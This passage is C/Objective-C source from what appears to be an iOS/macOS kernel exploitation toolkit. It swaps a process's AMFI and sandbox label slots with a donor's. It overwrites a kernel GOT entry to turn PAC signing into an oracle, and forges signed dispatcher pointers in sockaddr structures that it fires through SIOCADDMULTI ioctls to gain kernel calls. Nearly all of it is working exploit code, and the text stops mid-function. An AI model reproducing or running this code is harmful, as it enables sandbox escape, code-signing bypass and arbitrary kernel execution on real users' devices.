        borrow->donorLabel == borrow->targetLabel) return false;

    uint8_t donorBytes[CNDPhysicalKCall1LabelSize] = {0};
    borrow->captured = CNDPhysicalKCall1ReadLabel(
        api, borrow->targetLabel, borrow->originalLabel) &&
        CNDPhysicalKCall1ReadLabel(api, borrow->donorLabel, donorBytes);
    if (!borrow->captured) return false;
    memcpy(&borrow->originalAMFIObject,
        borrow->originalLabel + CNDPhysicalKCall1AMFISlotOffset,
        sizeof(borrow->originalAMFIObject));
    memcpy(&borrow->donorAMFIObject,
        donorBytes + CNDPhysicalKCall1AMFISlotOffset,
        sizeof(borrow->donorAMFIObject));
    memcpy(&borrow->originalSandboxObject,
        borrow->originalLabel + CNDPhysicalKCall1SandboxSlotOffset,
        sizeof(borrow->originalSandboxObject));
    memcpy(&borrow->donorSandboxObject,
        donorBytes + CNDPhysicalKCall1SandboxSlotOffset,
        sizeof(borrow->donorSandboxObject));
    if (!CNDPhysicalKCall1KernelObject(borrow->originalAMFIObject) ||
        !CNDPhysicalKCall1KernelObject(borrow->donorAMFIObject) ||
        !CNDPhysicalKCall1KernelObject(borrow->originalSandboxObject) ||
        !CNDPhysicalKCall1KernelObject(borrow->donorSandboxObject) ||
        borrow->originalAMFIObject == borrow->donorAMFIObject ||
        borrow->originalSandboxObject == borrow->donorSandboxObject) {
        return false;
    }

    /* Cross-check the raw slot reads against the app's own accessors. */
    if (api->amfiCslotGet != NULL) {
        uint64_t viaAccessor = api->amfiCslotGet(borrow->donorLabel);
        if (viaAccessor != borrow->donorAMFIObject) return false;
    }
    if (api->labelGetSandbox != NULL) {
        uint64_t viaAccessor = api->labelGetSandbox(borrow->donorLabel);
        if (viaAccessor != borrow->donorSandboxObject) return false;
    }

    memcpy(borrow->borrowedLabel, borrow->originalLabel,
        sizeof(borrow->borrowedLabel));
    memcpy(borrow->borrowedLabel + CNDPhysicalKCall1AMFISlotOffset,
        &borrow->donorAMFIObject, sizeof(borrow->donorAMFIObject));
    memcpy(borrow->borrowedLabel + CNDPhysicalKCall1SandboxSlotOffset,
        &borrow->donorSandboxObject, sizeof(borrow->donorSandboxObject));
    borrow->writeAttempted = true;
    borrow->installed = CNDPhysicalKCall1WriteAndVerifyLabel(
        api, borrow->targetLabel, borrow->borrowedLabel, borrow);
    if (!borrow->installed) {
        borrow->restored =
            CNDPhysicalKCall1RestoreLabel(api, borrow->targetLabel,
                borrow->originalLabel);
    }
    return borrow->installed;
}

static bool CNDPhysicalKCall1RestoreBorrow(
    const CNDPhysicalKCall1KernelAPI *api, CNDPhysicalKCall1Borrow *borrow)
{
    if (api == NULL || borrow == NULL || !borrow->captured ||
        !borrow->writeAttempted) return false;
    borrow->restored = CNDPhysicalKCall1RestoreLabel(
        api, borrow->targetLabel, borrow->originalLabel);
    return borrow->restored;
}

/*
 * Map a registry service Mach port to its IONetworkInterface kernel object.
 * IORegistry service ports normally expose an IOMachPort wrapper as their
 * ip_kobject; the OSObject is the data pointer stored at wrapper+0x20.  Keep a
 * direct-kobject fallback for ports whose kobject is already the OSObject, but
 * never mistake the inline address wrapper+0x20 for the pointed-to object.
 */
static bool CNDPhysicalKCall1ResolveInterface(
    const CNDPhysicalKCall1KernelAPI *api, uint64_t task,
    io_service_t service, uint64_t *objectOut, NSString **pathOut)
{
    if (api == NULL || objectOut == NULL) return false;
    uint64_t raw = api->taskGetKobject(task, service);
    if (raw == 0 || !CNDPhysicalKCall1KernelObject(raw)) return false;
    uint64_t wrappedObjectRaw = 0;
    bool wrappedObjectRead = CNDPhysicalKCall1ReadU64(api,
        raw + (uint64_t)CNDPhysicalKCall1IOMachPortObjectOffset,
        &wrappedObjectRaw);
    uint64_t candidates[2] = {
        wrappedObjectRead
            ? CNDPhysicalKCall1StripDataPointer(wrappedObjectRaw) : 0,
        raw,
    };
    for (unsigned int step = 0; step < 2; step++) {
        uint64_t candidate = candidates[step];
        if (!CNDPhysicalKCall1KernelObject(candidate)) continue;
        uint64_t rawBacking = 0;
        if (!CNDPhysicalKCall1ReadU64(api,
                candidate + CNDPhysicalKCall1InterfaceBackingIfnetOffset,
                &rawBacking)) continue;
        uint64_t backing = CNDPhysicalKCall1StripDataPointer(rawBacking);
        if (CNDPhysicalKCall1KernelObject(backing)) {
            *objectOut = candidate;
            if (pathOut != NULL) {
                *pathOut = step == 0 ? @"iomachport-wrapper+0x20"
                    : @"direct-kobject";
            }
            return true;
        }
    }
    return false;
}

static NSArray<NSDictionary<NSString *, id> *> *CNDPhysicalKCall1Interfaces(
    const CNDPhysicalKCall1KernelAPI *kernel,
    const CNDPhysicalKCall1IOKitAPI *iokit, uint64_t task,
    NSMutableDictionary<NSString *, id> *report)
{
    NSMutableArray<NSDictionary<NSString *, id> *> *result =
        [NSMutableArray array];
    if (kernel == NULL || iokit == NULL) return result;
    CFMutableDictionaryRef matching =
        iokit->serviceMatching("IOUserEthernetInterface");
    io_iterator_t iterator = IO_OBJECT_NULL;
    kern_return_t kr = matching != NULL
        ? iokit->getMatchingServices(MACH_PORT_NULL, matching, &iterator)
        : KERN_RESOURCE_SHORTAGE;
    if (kr != KERN_SUCCESS || !MACH_PORT_VALID(iterator)) return result;
    for (;;) {
        io_service_t service = iokit->iteratorNext(iterator);
        if (!MACH_PORT_VALID(service)) break;
        uint64_t registryID = 0;
        (void)iokit->registryID(service, &registryID);
        CFTypeRef bsdName = iokit->registryProperty(
            service, CFSTR("BSD Name"), kCFAllocatorDefault, 0);
        io_string_t path = {0};
        kern_return_t pathKR = iokit->registryPath(
            service, kIOServicePlane, path);
        uint64_t object = 0;
        NSString *objectPath = @"unresolved";
        bool resolved = CNDPhysicalKCall1ResolveInterface(
            kernel, task, service, &object, &objectPath);
        NSMutableDictionary<NSString *, id> *entry =
            [NSMutableDictionary dictionaryWithDictionary:@{
                @"registryID": CNDPhysicalKCall1Hex(registryID),
                @"machPort": CNDPhysicalKCall1Hex(service),
                @"path": pathKR == KERN_SUCCESS
                    ? [NSString stringWithUTF8String:path] : @"",
                @"kernelObject": resolved
                    ? CNDPhysicalKCall1Hex(object) : @"",
                @"kernelObjectPath": objectPath,
            }];
        if (bsdName != NULL) {
            if (CFGetTypeID(bsdName) == CFStringGetTypeID()) {
                entry[@"bsdName"] = (__bridge NSString *)bsdName;
            }
            CFRelease(bsdName);
        }
        if (!resolved && report != nil) {
            report[@"interfaceObjectUnresolvedCount"] =
                @([report[@"interfaceObjectUnresolvedCount"] intValue] + 1);
        }
        [result addObject:entry];
        (void)iokit->objectRelease(service);
    }
    (void)iokit->objectRelease(iterator);
    return result;
}

enum { CNDPhysicalKCall1SignerInventoryMaxInterfaces = 256 };

static NSString *CNDPhysicalKCall1SignerRole(uint64_t target,
    uint64_t slide, NSString **detailOut)
{
    if (detailOut != NULL) *detailOut = @"";
    if (target == CNDPhysicalKCall1StaticEtherCheckMulti + slide) {
        return @"stock";
    }
    if (target == CNDPhysicalKCall1StaticAPFSX1Dispatcher + slide) {
        return @"apfs-x1";
    }
    if (target == CNDPhysicalKCall1StaticIOUATGetPTE + slide) {
        return @"get-pte";
    }
    if (target == CNDPhysicalKCall1StaticIfnetX0Dispatcher + slide) {
        return @"outer-x0";
    }
    for (size_t index = 0;
         index < sizeof(CNDPhysicalKCall1GlobalDispatchers) /
             sizeof(CNDPhysicalKCall1GlobalDispatchers[0]); index++) {
        const CNDPhysicalKCall1GlobalDispatcher *candidate =
            &CNDPhysicalKCall1GlobalDispatchers[index];
        if (target == candidate->target + slide) {
            if (detailOut != NULL) {
                *detailOut = [NSString stringWithUTF8String:candidate->name]
                    ?: @"";
            }
            return @"idam-global";
        }
    }
    return @"";
}

static void CNDPhysicalKCall1InventoryClass(
    const CNDPhysicalKCall1KernelAPI *kernel,
    const CNDPhysicalKCall1IOKitAPI *iokit, uint64_t task, uint64_t slide,
    const char *className, NSMutableSet<NSString *> *seenRegistryIDs,
    NSMutableArray<NSDictionary<NSString *, id> *> *entries,
    NSMutableDictionary<NSString *, NSNumber *> *roleCounts,
    NSMutableArray<NSDictionary<NSString *, id> *> *queryResults,
    BOOL *truncated)
{
    if (kernel == NULL || iokit == NULL || className == NULL ||
        seenRegistryIDs == nil || entries == nil || roleCounts == nil ||
        queryResults == nil || truncated == NULL || *truncated) return;

    CFMutableDictionaryRef matching = iokit->serviceMatching(className);
    io_iterator_t iterator = IO_OBJECT_NULL;
    kern_return_t kr = matching != NULL
        ? iokit->getMatchingServices(MACH_PORT_NULL, matching, &iterator)
        : KERN_RESOURCE_SHORTAGE;
    NSMutableDictionary *query = [@{
        @"class": [NSString stringWithUTF8String:className] ?: @"",
        @"result": @((uint32_t)kr),
        @"visited": @0,
    } mutableCopy];
    [queryResults addObject:query];
    if (kr != KERN_SUCCESS || !MACH_PORT_VALID(iterator)) return;

    NSUInteger visited = 0;
    for (;;) {
        io_service_t service = iokit->iteratorNext(iterator);
        if (!MACH_PORT_VALID(service)) break;
        if (entries.count >= CNDPhysicalKCall1SignerInventoryMaxInterfaces) {
            *truncated = YES;
            (void)iokit->objectRelease(service);
            break;
        }
        visited++;
        uint64_t registryID = 0;
        (void)iokit->registryID(service, &registryID);
        NSString *registryKey = CNDPhysicalKCall1Hex(registryID);
        if (registryID != 0 && [seenRegistryIDs containsObject:registryKey]) {
            (void)iokit->objectRelease(service);
            continue;
        }
        if (registryID != 0) [seenRegistryIDs addObject:registryKey];

        CFTypeRef bsdName = iokit->registryProperty(
            service, CFSTR("BSD Name"), kCFAllocatorDefault, 0);
        io_string_t path = {0};
        kern_return_t pathKR = iokit->registryPath(
            service, kIOServicePlane, path);
        uint64_t object = 0;
        NSString *objectPath = @"unresolved";
        bool resolved = CNDPhysicalKCall1ResolveInterface(
            kernel, task, service, &object, &objectPath);
        uint64_t rawBacking = 0, backing = 0, callbackRaw = 0;
        uint64_t legacyCallbackRaw = 0, legacyCallbackTarget = 0;
        uint64_t protoHashCount = 0, protoHashRaw = 0;
        uint64_t callbackTarget = 0, x0Raw = 0, targetFieldRaw = 0;
        bool fieldsRead = resolved &&
            CNDPhysicalKCall1ReadU64(kernel,
                object + CNDPhysicalKCall1InterfaceBackingIfnetOffset,
                &rawBacking);
        if (fieldsRead) {
            backing = CNDPhysicalKCall1StripDataPointer(rawBacking);
            fieldsRead = CNDPhysicalKCall1KernelObject(backing) &&
                CNDPhysicalKCall1ReadU64(kernel,
                    backing +
                        CNDPhysicalKCall1InventoryIfnetCheckMultiOffset,
                    &callbackRaw) &&
                CNDPhysicalKCall1ReadU64(kernel,
                    backing + CNDPhysicalKCall1IfnetCheckMultiOffset,
                    &legacyCallbackRaw) &&
                CNDPhysicalKCall1ReadU64(kernel,
                    backing +
                        CNDPhysicalKCall1InventoryIfnetProtoHashCountOffset,
                    &protoHashCount) &&
                CNDPhysicalKCall1ReadU64(kernel,
                    backing + CNDPhysicalKCall1InventoryIfnetProtoHashOffset,
                    &protoHashRaw) &&
                CNDPhysicalKCall1ReadU64(kernel,
                    backing + CNDPhysicalKCall1IfnetX0Offset, &x0Raw) &&
                CNDPhysicalKCall1ReadU64(kernel,
                    backing + CNDPhysicalKCall1IfnetTargetOffset,
                    &targetFieldRaw);
        }
        callbackTarget = callbackRaw != 0
            ? CNDPhysicalKCall1StripInstructionPointer(callbackRaw) : 0;
        legacyCallbackTarget = legacyCallbackRaw != 0
            ? CNDPhysicalKCall1StripInstructionPointer(legacyCallbackRaw) : 0;
        NSString *roleDetail = @"";
        NSString *role = CNDPhysicalKCall1SignerRole(
            callbackTarget, slide, &roleDetail);
        BOOL looksPACEncoded = fieldsRead && callbackRaw != 0 &&
            callbackRaw != callbackTarget &&
            CNDPhysicalKCall1VirtualAddress(callbackTarget);
        BOOL transplantable = looksPACEncoded && role.length > 0;
        if (transplantable) {
            roleCounts[role] = @([roleCounts[role] unsignedIntegerValue] + 1);
        }

        NSMutableDictionary<NSString *, id> *entry =
            [NSMutableDictionary dictionaryWithDictionary:@{
                @"sourceClass": [NSString stringWithUTF8String:className]
                    ?: @"",
                @"registryID": registryKey,
                @"machPort": CNDPhysicalKCall1Hex(service),
                @"path": pathKR == KERN_SUCCESS
                    ? [NSString stringWithUTF8String:path] ?: @"" : @"",
                @"kernelObject": resolved
                    ? CNDPhysicalKCall1Hex(object) : @"",
                @"kernelObjectPath": objectPath ?: @"",
                @"fieldsRead": @(fieldsRead),
                @"backingIfnetRaw": CNDPhysicalKCall1Hex(rawBacking),
                @"backingIfnet": CNDPhysicalKCall1Hex(backing),
                @"checkMultiRaw": CNDPhysicalKCall1Hex(callbackRaw),
                @"checkMultiTarget": CNDPhysicalKCall1Hex(callbackTarget),
                @"legacy238CallbackRaw":
                    CNDPhysicalKCall1Hex(legacyCallbackRaw),
                @"legacy238CallbackTarget":
                    CNDPhysicalKCall1Hex(legacyCallbackTarget),
                @"protoHashCount": CNDPhysicalKCall1Hex(protoHashCount),
                @"protoHashRaw": CNDPhysicalKCall1Hex(protoHashRaw),
                @"checkMultiLooksPACEncoded": @(looksPACEncoded),
                @"matchedRole": role,
                @"matchedRoleDetail": roleDetail,
                @"transplantableCandidate": @(transplantable),
                @"x0FieldRaw": CNDPhysicalKCall1Hex(x0Raw),
                @"targetFieldRaw": CNDPhysicalKCall1Hex(targetFieldRaw),
            }];
        if (bsdName != NULL) {
            if (CFGetTypeID(bsdName) == CFStringGetTypeID()) {
                entry[@"bsdName"] = (__bridge NSString *)bsdName;
            }
            CFRelease(bsdName);
        }
        [entries addObject:entry];
        (void)iokit->objectRelease(service);
    }
    query[@"visited"] = @(visited);
    (void)iokit->objectRelease(iterator);
}

static int CNDPhysicalKCall1PrepareCanary(
    const CNDPhysicalKCall1KernelAPI *api, uint64_t slide,
    CNDPhysicalKCall1Canary *canary,
    NSMutableDictionary<NSString *, id> *report)
{
    if (api == NULL || canary == NULL || report == nil) return EINVAL;
    *canary = (CNDPhysicalKCall1Canary){0};
    canary->gotAddress = CNDPhysicalKCall1StaticCheckMultiGOT + slide;
    canary->canaryTarget = CNDPhysicalKCall1StaticEnoexecReturn + slide;
    uint32_t instructions[3] = {0};
    bool read = CNDPhysicalKCall1ReadU64(api, canary->gotAddress,
        &canary->originalRaw) &&
        CNDPhysicalKCall1ReadBytes(api, canary->canaryTarget,
            instructions, sizeof(instructions));
    uint64_t expectedOriginal =
        CNDPhysicalKCall1StaticEtherCheckMulti + slide;
    canary->originalTarget =
        CNDPhysicalKCall1StripInstructionPointer(canary->originalRaw);
    canary->originalIsPACSigned =
        canary->originalRaw != expectedOriginal;
    report[@"ifnetPACGOTAddress"] =
        CNDPhysicalKCall1Hex(canary->gotAddress);
    report[@"ifnetPACGOTOriginalRaw"] =
        CNDPhysicalKCall1Hex(canary->originalRaw);
    report[@"ifnetPACGOTOriginalTarget"] =
        CNDPhysicalKCall1Hex(canary->originalTarget);
    report[@"ifnetPACGOTExpectedTarget"] =
        CNDPhysicalKCall1Hex(expectedOriginal);
    report[@"ifnetPACGOTOriginalForm"] =
        canary->originalIsPACSigned ? @"pac-signed" : @"plain";
    report[@"ifnetPACCanaryTarget"] =
        CNDPhysicalKCall1Hex(canary->canaryTarget);
    report[@"ifnetPACCanaryInstruction0"] =
        CNDPhysicalKCall1Hex(instructions[0]);
    report[@"ifnetPACCanaryInstruction1"] =
        CNDPhysicalKCall1Hex(instructions[1]);
    report[@"ifnetPACCanaryInstruction2"] =
        CNDPhysicalKCall1Hex(instructions[2]);
    report[@"ifnetPACInitIfnetParams"] = CNDPhysicalKCall1Hex(
        CNDPhysicalKCall1StaticInitIfnetParams + slide);
    report[@"ifnetPACSignerInstruction"] = CNDPhysicalKCall1Hex(
        CNDPhysicalKCall1StaticCheckMultiSigner + slide);
    report[@"ifnetPACDiscriminator"] = @"0xe4fe";

    if (!read) return EIO;
    /* The GOT may hold the stock pointer either plain (chained-fixup rebase,
     * as on the VM) or PAC-signed; both strip to the stock target and both
     * are written back verbatim, so either form is accepted and recorded. */
    if (canary->originalRaw != expectedOriginal &&
        canary->originalTarget != expectedOriginal) {
        return EILSEQ;
    }
    if (instructions[0] != CNDPhysicalKCall1ExpectedEnoexec[0] ||
        instructions[1] != CNDPhysicalKCall1ExpectedEnoexec[1] ||
        instructions[2] != CNDPhysicalKCall1ExpectedEnoexec[2]) {
        return EILSEQ;
    }
    canary->ready = true;
    return 0;
}

static int CNDPhysicalKCall1InstallCanary(
    const CNDPhysicalKCall1KernelAPI *api, CNDPhysicalKCall1Canary *canary)
{
    if (api == NULL || canary == NULL || !canary->ready ||
        canary->installed) {
        return EINVAL;
    }
    if (!CNDPhysicalKCall1WriteU64Verify(
            api, canary->gotAddress, canary->canaryTarget)) {
        return EIO;
    }
    canary->installed = true;
    return 0;
}

static bool CNDPhysicalKCall1RestoreCanary(
    const CNDPhysicalKCall1KernelAPI *api, CNDPhysicalKCall1Canary *canary)
{
    if (api == NULL || canary == NULL || !canary->ready) return false;
    for (unsigned int attempt = 0; attempt < 3; attempt++) {
        if (CNDPhysicalKCall1WriteU64Verify(api, canary->gotAddress,
                canary->originalRaw)) {
            canary->installed = false;
            canary->restored = true;
            return true;
        }
    }
    return false;
}

static void CNDPhysicalKCall1TriggerIfnetCheckMulti(NSString *bsdName,
    int *ioctlResult, int *ioctlErrno,
    int *cleanupResult, int *cleanupErrno)
{
    if (ioctlResult != NULL) *ioctlResult = -1;
    if (ioctlErrno != NULL) *ioctlErrno = EINVAL;
    if (cleanupResult != NULL) *cleanupResult = -1;
    if (cleanupErrno != NULL) *cleanupErrno = 0;
    const char *name = bsdName.UTF8String;
    if (name == NULL || name[0] == '\0' || strlen(name) >= IFNAMSIZ) return;

    int socketFD = socket(AF_INET, SOCK_DGRAM, 0);
    if (socketFD < 0) {
        if (ioctlErrno != NULL) *ioctlErrno = errno;
        return;
    }
    struct ifreq request = {0};
    strlcpy(request.ifr_name, name, sizeof(request.ifr_name));
    request.ifr_addr.sa_len = sizeof(request.ifr_addr);
    request.ifr_addr.sa_family = AF_UNSPEC;
    const uint8_t multicastAddress[6] = {
        0x01, 0x00, 0x5e, 0x00, 0x00, 0xfb,
    };
    memcpy(request.ifr_addr.sa_data, multicastAddress,
        sizeof(multicastAddress));
    errno = 0;
    int result = ioctl(socketFD, SIOCADDMULTI, &request);
    int savedErrno = errno;
    if (ioctlResult != NULL) *ioctlResult = result;
    if (ioctlErrno != NULL) *ioctlErrno = savedErrno;

    if (result == 0) {
        errno = 0;
        int removed = ioctl(socketFD, SIOCDELMULTI, &request);
        int removeErrno = errno;
        if (cleanupResult != NULL) *cleanupResult = removed;
        if (cleanupErrno != NULL) *cleanupErrno = removeErrno;
    }
    close(socketFD);
}

/* The APFS adapter consumes the two qwords of the sockaddr exactly as passed
 * to check_multi: qword 0 is an e4fe-signed next PC and qword 1 becomes X1.
 * The runtime-selected global dispatcher is required to encode sa_family as
 * AF_UNSPEC or AF_LINK in its second address byte while leaving the signed
 * pointer intact. */
static void CNDPhysicalKCall1TriggerRawSockaddr(
    NSString *bsdName, uint64_t signedDispatcher, uint64_t x1,
    int *ioctlResult, int *ioctlErrno)
{
    if (ioctlResult != NULL) *ioctlResult = -1;
    if (ioctlErrno != NULL) *ioctlErrno = EINVAL;
    const char *name = bsdName.UTF8String;
    if (name == NULL || name[0] == '\0' || strlen(name) >= IFNAMSIZ) return;

    int socketFD = socket(AF_INET, SOCK_DGRAM, 0);
    if (socketFD < 0) {
        if (ioctlErrno != NULL) *ioctlErrno = errno;
        return;
    }
    struct ifreq request = {0};
    strlcpy(request.ifr_name, name, sizeof(request.ifr_name));
    _Static_assert(sizeof(request.ifr_addr) == 16,
        "23A341 sockaddr transport must be exactly two qwords");
    memcpy((uint8_t *)&request.ifr_addr, &signedDispatcher,
        sizeof(signedDispatcher));
    memcpy((uint8_t *)&request.ifr_addr + 8, &x1, sizeof(x1));
    errno = 0;
    int result = ioctl(socketFD, SIOCADDMULTI, &request);
    int savedErrno = errno;
    if (ioctlResult != NULL) *ioctlResult = result;
    if (ioctlErrno != NULL) *ioctlErrno = savedErrno;
    close(socketFD);
}

static void CNDPhysicalKCall1CleanupRawSockaddr(
    NSString *bsdName, uint64_t signedDispatcher, uint64_t x1,
    int *ioctlResult, int *ioctlErrno)
{
    if (ioctlResult != NULL) *ioctlResult = -1;
    if (ioctlErrno != NULL) *ioctlErrno = 0;
    const char *name = bsdName.UTF8String;
    if (name == NULL || name[0] == '\0' || strlen(name) >= IFNAMSIZ) return;
    int socketFD = socket(AF_INET, SOCK_DGRAM, 0);
    if (socketFD < 0) {
        if (ioctlErrno != NULL) *ioctlErrno = errno;
        return;
    }
    struct ifreq request = {0};
    strlcpy(request.ifr_name, name, sizeof(request.ifr_name));
    memcpy((uint8_t *)&request.ifr_addr, &signedDispatcher,
        sizeof(signedDispatcher));
    memcpy((uint8_t *)&request.ifr_addr + 8, &x1, sizeof(x1));
    errno = 0;
    int result = ioctl(socketFD, SIOCDELMULTI, &request);
    int savedErrno = errno;
    if (ioctlResult != NULL) *ioctlResult = result;
    if (ioctlErrno != NULL) *ioctlErrno = savedErrno;
    close(socketFD);
}

static void CNDPhysicalKCall1ReportSignedIfnet(
    NSMutableDictionary<NSString *, id> *report, NSString *prefix,
    const CNDPhysicalKCall1SignedInterface *value)
{
    if (report == nil || prefix == nil || value == NULL) return;
    report[[prefix stringByAppendingString:@"BSDName"]] =
        value->bsdName[0] != '\0'
            ? [NSString stringWithUTF8String:value->bsdName] : @"";
    report[[prefix stringByAppendingString:@"RegistryID"]] =
        CNDPhysicalKCall1Hex(value->registryID);
    report[[prefix stringByAppendingString:@"InterfaceObject"]] =
        CNDPhysicalKCall1Hex(value->interfaceObject);
    report[[prefix stringByAppendingString:@"BackingIfnet"]] =
        CNDPhysicalKCall1Hex(value->backingIfnet);
    report[[prefix stringByAppendingString:@"SignedCallback"]] =
        CNDPhysicalKCall1Hex(value->signedCallback);
    report[[prefix stringByAppendingString:@"CallbackTarget"]] =
        CNDPhysicalKCall1Hex(value->callbackTarget);
    report[[prefix stringByAppendingString:@"ControllerCookie"]] =
        CNDPhysicalKCall1Hex(value->controllerCookie);
    report[[prefix stringByAppendingString:@"CallKR"]] =
        CNDPhysicalKCall1Hex((uint32_t)value->callKR);
    report[[prefix stringByAppendingString:@"ReadbackResult"]] =
        @(value->readbackResult);
}

static int CNDPhysicalKCall1CreateSignedIfnet(
    const CNDPhysicalKCall1KernelAPI *kernel,
    const CNDPhysicalKCall1IOKitAPI *iokit, io_connect_t connection,
    uint64_t selfTask, NSMutableSet<NSString *> *knownIDs,
    CNDPhysicalKCall1Canary *signer, uint64_t chosenTarget,
    uint64_t callbackOffset, uint8_t stage,
    CNDPhysicalKCall1SignedInterface *created, NSArray **latestInterfaces,
    NSMutableDictionary<NSString *, id> *report,
    bool *criticalRestoreFailure)
{
    if (!MACH_PORT_VALID(connection) || knownIDs == nil || signer == NULL ||
        !signer->ready || !CNDPhysicalKCall1VirtualAddress(chosenTarget) ||
        (callbackOffset != CNDPhysicalKCall1IfnetCheckMultiOffset &&
         callbackOffset !=
            CNDPhysicalKCall1InventoryIfnetCheckMultiOffset) ||
        created == NULL) return EINVAL;
    *created = (CNDPhysicalKCall1SignedInterface){
        .callKR = KERN_FAILURE,
        .readbackResult = ENOENT,
    };
    signer->canaryTarget = chosenTarget;
    signer->restored = false;
    int installResult = CNDPhysicalKCall1InstallCanary(kernel, signer);
    if (installResult != 0) {
        bool restored = CNDPhysicalKCall1RestoreCanary(kernel, signer);
        if (!restored && criticalRestoreFailure != NULL) {
            *criticalRestoreFailure = true;
        }
        return installResult;
    }

    uint32_t pid = (uint32_t)getpid();
    uint8_t mac[6] = {
        0x02, 0xc1, stage, 0x26,
        (uint8_t)(pid >> 8), (uint8_t)pid,
    };
    NSDictionary *properties = @{
        @"HardwareAddress": [NSData dataWithBytes:mac length:6],
        @"MinPacketSize": @64,
        @"MaxPacketSize": @1514,
        @"MaxTransferUnit": @1500,
        @"NamePrefix": @"kcl",
    };
    CFDataRef serialized = iokit->serialize(
        (__bridge CFTypeRef)properties, kIOCFSerializeToBinary);
    if (serialized == NULL) {
        bool restored = CNDPhysicalKCall1RestoreCanary(kernel, signer);
        if (!restored && criticalRestoreFailure != NULL) {
            *criticalRestoreFailure = true;
        }
        return ENOMEM;
    }

    uint32_t scalarOutputCount = 1;
    created->callKR = iokit->connectCallMethod(connection, 0, NULL, 0,
        CFDataGetBytePtr(serialized), (size_t)CFDataGetLength(serialized),
        &created->controllerCookie, &scalarOutputCount, NULL, NULL);
    CFRelease(serialized);

    /* The target is consumed synchronously while selector 0 constructs the
     * ifnet parameters.  Restore the global GOT before registry publication
     * polling, keeping the mutation window to the one selector call. */
    bool gotRestored = CNDPhysicalKCall1RestoreCanary(kernel, signer);
    if (!gotRestored && criticalRestoreFailure != NULL) {
        *criticalRestoreFailure = true;
    }
    if (!gotRestored) return EIO;

    unsigned int polls = created->callKR == KERN_SUCCESS
        ? CND_PHYSICAL_KCALL1_MAX_POLLS : 1;
    for (unsigned int attempt = 0; attempt < polls; attempt++) {
        NSArray *snapshot = CNDPhysicalKCall1Interfaces(
            kernel, iokit, selfTask, report);
        if (latestInterfaces != NULL) *latestInterfaces = snapshot;
        for (NSDictionary *entry in snapshot) {
            NSString *identifier = entry[@"registryID"];
            NSString *name = entry[@"bsdName"];
            NSString *object = entry[@"kernelObject"];
            if (![identifier isKindOfClass:[NSString class]] ||
                [knownIDs containsObject:identifier] ||
                ![name isKindOfClass:[NSString class]] || name.length == 0 ||
                ![object isKindOfClass:[NSString class]] ||
                object.length == 0) {
                continue;
            }
            uint64_t registryID = 0;
            uint64_t interfaceObject = 0;
            if (![[NSScanner scannerWithString:[identifier
                    substringFromIndex:2]] scanHexLongLong:&registryID] ||
                ![[NSScanner scannerWithString:[object
                    substringFromIndex:2]]
                    scanHexLongLong:&interfaceObject]) continue;
            created->registryID = registryID;
            created->interfaceObject = interfaceObject;
            strlcpy(created->bsdName, name.UTF8String,
                sizeof(created->bsdName));
            [knownIDs addObject:identifier];
            break;
        }
        if (created->bsdName[0] != '\0' || attempt + 1 == polls) break;
        usleep(CND_PHYSICAL_KCALL1_POLL_INTERVAL_US);
    }

    if (created->callKR != KERN_SUCCESS) return (int)created->callKR;
    if (created->bsdName[0] == '\0' ||
        !CNDPhysicalKCall1KernelObject(created->interfaceObject)) {
        return ENOENT;
    }

    uint64_t rawBackingIfnet = 0;
    if (!CNDPhysicalKCall1ReadU64(kernel,
            created->interfaceObject +
                CNDPhysicalKCall1InterfaceBackingIfnetOffset,
            &rawBackingIfnet)) {
        created->readbackResult = EIO;
        return created->readbackResult;
    }
    created->backingIfnet =
        CNDPhysicalKCall1StripDataPointer(rawBackingIfnet);
    created->readbackResult = 0;
    if (CNDPhysicalKCall1KernelObject(created->backingIfnet)) {
        if (!CNDPhysicalKCall1ReadU64(kernel,
                created->backingIfnet +
                    callbackOffset,
                &created->signedCallback)) {
            created->readbackResult = EIO;
        }
    } else {
        created->readbackResult = EILSEQ;
    }
    created->callbackTarget =
        CNDPhysicalKCall1StripInstructionPointer(created->signedCallback);
    if (created->readbackResult == 0 &&
        created->callbackTarget != chosenTarget) {
        created->readbackResult = EILSEQ;
    }
    return created->readbackResult;
}

/*
 * Bounded signer-oracle validation.  It creates exactly one interface while
 * the check_multi GOT names the already-pinned ENOEXEC return stub, restores
 * that GOT before polling registry state, and only reads the resulting
 * IA/e4fe callback at the hardware-validated ifnet+0x2a8 field.  It never
 * changes an ifnet field and never issues a network ioctl/callback trigger.
 */
static int CNDPhysicalKCall1RunSignerOracle(
    const CNDPhysicalKCall1KernelAPI *kernel,
    const CNDPhysicalKCall1IOKitAPI *iokit, uint64_t slide,
    io_connect_t connection, uint64_t selfTask,
    NSMutableSet<NSString *> *knownIDs,
    NSMutableDictionary<NSString *, id> *report, NSArray **after,
    kern_return_t *lastCallKR, uint64_t *lastControllerCookie,
    CNDPhysicalKCall1SignedInterface *createdOut,
    bool *criticalRestoreFailure)
{
    if (kernel == NULL || iokit == NULL || knownIDs == nil || report == nil ||
        after == NULL || lastCallKR == NULL || lastControllerCookie == NULL ||
        createdOut == NULL || criticalRestoreFailure == NULL) return EINVAL;

    CNDPhysicalKCall1Canary signer = {0};
    int result = CNDPhysicalKCall1PrepareCanary(
        kernel, slide, &signer, report);
    uint64_t chosenTarget = CNDPhysicalKCall1StaticEnoexecReturn + slide;
    report[@"signerOracleSetupResult"] = @(result);
    report[@"signerOracleChosenTarget"] =
        CNDPhysicalKCall1Hex(chosenTarget);
    report[@"signerOracleCallbackOffset"] =
        @(CNDPhysicalKCall1InventoryIfnetCheckMultiOffset);
    report[@"signerOracleLegacyWrongOffset"] =
        @(CNDPhysicalKCall1IfnetCheckMultiOffset);
    report[@"signerOracleInterfaceFieldWriteAttempted"] = @NO;
    report[@"signerOracleIoctlInvoked"] = @NO;
    report[@"signerOracleCallbackInvoked"] = @NO;
    report[@"signerOracleGlobalSlotWriteAttempted"] = @NO;
    report[@"signerOracleCreatedInterfaceCount"] = @0;
    if (result != 0) return result;

    result = CNDPhysicalKCall1CreateSignedIfnet(
        kernel, iokit, connection, selfTask, knownIDs, &signer,
        chosenTarget, CNDPhysicalKCall1InventoryIfnetCheckMultiOffset,
        0x71, createdOut, after, report, criticalRestoreFailure);
    CNDPhysicalKCall1ReportSignedIfnet(
        report, @"signerOracle", createdOut);
    *lastCallKR = createdOut->callKR;
    *lastControllerCookie = createdOut->controllerCookie;
    report[@"signerOracleStageResult"] = @(result);
    report[@"signerOracleCreatedInterfaceCount"] =
        @(createdOut->registryID != 0 ? 1 : 0);

    uint64_t field90 = 0, fieldB0 = 0;
    uint64_t protoHashCount = 0, protoHash = 0, finalGOT = 0;
